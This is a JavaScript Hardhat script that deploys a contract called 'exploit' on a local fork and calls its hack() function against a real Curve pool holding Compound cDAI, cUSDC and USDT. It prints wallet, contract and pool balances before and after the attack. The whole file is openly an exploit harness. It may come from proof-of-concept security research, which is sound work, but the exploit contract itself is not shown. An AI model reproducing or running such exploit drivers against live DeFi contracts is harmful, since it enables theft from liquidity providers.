const { exec } = require('./utilities.js')
const hre = require("hardhat");
const ethers = require('ethers');

const privatekey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80'
const pubkey = '0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266'
const erc20Abi = [{ "constant": true, "inputs": [{ "name": "_owner", "type": "address"}],"name": "balanceOf","outputs": [{"name": "balance","type": "uint256"}],"payable": false,"type": "function"}]
const curveAbi = [{"name":"balances","outputs":[{"type":"uint256","name":"out"}],"inputs":[{"type":"int128","name":"arg0"}],"constant":true,"payable":false,"type":"function","gas":2250}]
const url = "http://127.0.0.1:8545/"
const ethersOptions = { gasLimit: 9000000, gasPrice: 0};
const cerc20Abi = [{"constant":true,"inputs":[],"name":"exchangeRateStored","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}]
					
const provider = new ethers.providers.JsonRpcProvider(url);
let wallet = new ethers.Wallet(privatekey, provider);
let coins = [ethers.BigNumber.from("1671366519637560").add(1000000),ethers.BigNumber.from("3153232734120070").add(1000000), ethers.BigNumber.from("391505527561").add(1000000)]

let curveaddr = '0x52EA46506B9CC5Ef470C5bf89f17Dc28bB35D85C'

let tokens = {
	'dai': "0x6B175474E89094C44Da98b954EedeAC495271d0F",
	'usdc': "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
	'usdt': "0xdAC17F958D2ee523a2206206994597C13D831ec7",
	'curve_pool_token': "0x9fC689CCaDa600B6DF723D9E47D84d76664a1F23",
	'cusdt:': "0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9",
	'cdai': "0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643",
	'cusdc': "0x39AA39c021dfbaE8faC545936693aC917d5E7563"
}

let decimals = {
	'eth':18,
	'dai':18,
	'usdc': 6,
	'usdt': 6,
	'cusdt:': 8,
	'cdai': 8,
	'cusdc': 8,
	'0x9fC689CCaDa600B6DF723D9E47D84d76664a1F23':0
}

async function ourStatus(contractAddr) {
	//cdai
	const contract_cdai = new ethers.Contract(tokens['cdai'], cerc20Abi, provider);
	console.log('cdai.exchangeRateCurrent():', (await contract_cdai.exchangeRateStored()).toString())	
	
	//cusdc
	const contract_cusdc = new ethers.Contract(tokens['cusdc'], cerc20Abi, provider);
	console.log('cusdc.exchangeRateCurrent():', (await contract_cusdc.exchangeRateStored()).toString())	
	
	
	console.log('On Ethereum mainnet block', (await provider.getBlock()).number)
	console.log('On Ethereum mainnet hash', (await provider.getBlock()).hash)
	console.log('Our wallet:', pubkey)
	console.log('  ', 'ETH:', (ethers.utils.formatUnits((await wallet.getBalance()).toString(),decimals['eth'])).toString());
	
	for (var key in tokens) {
		const contract = new ethers.Contract(tokens[key], erc20Abi, provider);
		let amount = ethers.utils.formatUnits((await contract.balanceOf(pubkey)).toString(),decimals[key])
		console.log('  ',key,':', amount.toString())	
	}
	console.log('Exploit Contract:', contractAddr)
	let amount = ethers.utils.formatUnits((await provider.getBalance(contractAddr)).toString(),decimals['eth'])
	console.log('  ', 'ETH:', amount.toString());
	for (var key in tokens) {
		const contract = new ethers.Contract(tokens[key], erc20Abi, provider);
		let amount = ethers.utils.formatUnits((await contract.balanceOf(contractAddr)).toString(),decimals[key])
		console.log('  ',key,':', amount.toString())	
	}
	
	console.log('Curve:', curveaddr)
	const contract = new ethers.Contract(curveaddr, curveAbi, provider);
	console.log('  ','cdai:', ethers.utils.formatUnits((await contract.balances(0)).toString(),decimals['cdai']).toString())
	console.log('  ','cusdc:', ethers.utils.formatUnits((await contract.balances(1)).toString(),decimals['cusdc']).toString())
	console.log('  ','usdt:', ethers.utils.formatUnits((await contract.balances(2)).toString(),decimals['usdt']).toString())
	
	
}


async function f() {

	console.log('DEPLOYING EXPLOIT')
	const Exploit = await hre.ethers.getContractFactory('exploit',wallet);
	const exploit = await Exploit.deploy(ethersOptions);
	let exploitContract = await exploit.deployed();
	let ethToSend = 0.02543*3;
	const callOptions = { gasLimit: 9000000, gasPrice: 0, value: ethers.utils.parseEther(ethToSend.toString())};
	
	await ourStatus(exploitContract.address)
	
	console.log('stored rates')
	rates = await exploitContract._stored_rates();
	for(var r in rates) {
		console.log(ethers.BigNumber.from(rates[r]).toString())
	}
	
	console.log('SENDING EXPLOIT')
	
	exploitContract.hack(callOptions ).then(function(tx) {
		//console.log(tx);
		return tx.wait(1).then((receipt) => {
			console.log('confirmed!')
			//console.log(receipt)
			
			let ourEvents = []
			for (var i = 0; i < receipt.logs.length; i++) {
				if(receipt.logs[i].address == exploitContract.address) {
					ourEvents.push(receipt.logs[i])
				}
			}
			
			let events = ourEvents.map((log) => exploit.interface.parseLog(log))
			for (var i = 0; i < events.length; i++) {
				console.log(events[i].args.info, '= [',ethers.BigNumber.from(events[i].args['b1']).toString(), ', ', ethers.BigNumber.from(events[i].args['b2']).toString(), ', ',ethers.BigNumber.from(events[i].args['b3']).toString(),']')
			}
			console.log('EXPLOIT COMPLETE')
			ourStatus(exploitContract.address)
		}).catch(function(e) {
			console.log(e)
		})
	}, function(e) {
		console.log(e)
		console.log('hello')
	})
	
	
}
console.log('STARTING EXPLOIT')
f()